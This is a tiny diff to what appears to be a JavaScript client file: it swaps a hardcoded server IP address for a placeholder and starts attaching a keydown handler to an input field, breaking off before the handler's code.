@@ -1,4 +1,4 @@
-var addr = "http://90.188.151.177/";
+var addr = "http://yourAddressHere!!!/";
 var inputField = document.getElementById("input");
 inputField.onkeydown = 
 
